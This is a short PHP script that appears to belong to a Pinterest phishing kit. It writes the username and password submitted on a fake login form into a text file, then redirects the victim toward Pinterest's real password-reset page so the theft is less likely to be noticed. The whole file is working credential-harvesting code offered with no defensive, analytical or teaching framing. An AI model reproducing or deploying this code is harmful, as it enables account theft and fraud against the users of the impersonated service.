<?php
file_put_contents("usernames.txt", "Pinterest Username: " . $_POST['id'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.pinterest.com/password/reset/
header("Location: $url");
exit();
?>